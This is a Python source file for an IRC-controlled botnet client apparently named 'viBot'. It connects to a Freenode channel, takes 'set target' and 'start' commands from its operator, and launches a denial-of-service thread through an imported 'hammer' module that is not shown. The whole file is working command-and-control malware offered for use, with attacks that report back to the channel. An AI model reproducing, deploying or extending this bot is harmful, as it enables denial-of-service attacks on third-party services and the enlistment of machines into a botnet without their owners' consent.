#!/usr/bin/env python
#-*- coding: utf-8 -*-
#
#

__author__  = "Black Viking"
__version__ = "v0.0.1"

__date__    = "20.06.2017"
__mail__    = "blackvkng@yandex.com"

import os
import sys
import random
import socket
import getpass
import threading

from modules import hammer

SERVER = "chat.freenode.net"
CHNL   = "#viBotChannel"
PORT   = "6667"
BASE   = "blackvkng"
NICK   = "viBot" + getpass.getuser() + str(random.randrange(1, 999))

IRC = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

IRC.connect((SERVER, int(PORT)))

def send(text):
	IRC.send(text+"\n\r")

def login():
	send("USER " + ' '.join([NICK for i in range(4)]))
	send("NICK " + NICK)
	send("JOIN " + CHNL)

def recv():
	while True:
		msg = IRC.recv(4096)

def start(url):
	global thread
	
	thread = threading.Thread(target=hammer.run, args=(url, ))
	thread.daemon = True
	thread.start()

def run(msg, priv=False):
	global TARGET
	
	receiver = BASE if priv == True else CHNL

	if "set target" in msg:
		msg = msg.split(" ")

		TARGET = msg[-1]

		if len(msg) > 3:
			send("PRIVMSG %s :%s"%(receiver, "Target: "+TARGET))

	elif msg == "start":
		if TARGET:
			start(TARGET)
			send("PRIVMSG %s :%s"%(receiver, "Attack started, Target: "+TARGET))
		else:
			pass
					
	else:
		pass

def main():
	while True:
		msg = IRC.recv(4096)
		msg = msg.split()

		if msg[0] == "PING":
			send("PONG " + msg[1])

		elif BASE in msg[0] and msg[2] == CHNL:
			msg = ' '.join(msg[3:])[1:].lower()
			print BASE + " - " + CHNL + " -> " + msg
			
			run(msg)


		elif BASE in msg[0] and msg[2] == NICK:
			msg = ' '.join(msg[3:])[1:].lower()
			print BASE + " - " + NICK + " -> " + msg

			run(msg, True)
			

if __name__ == "__main__":
	login()
	main()
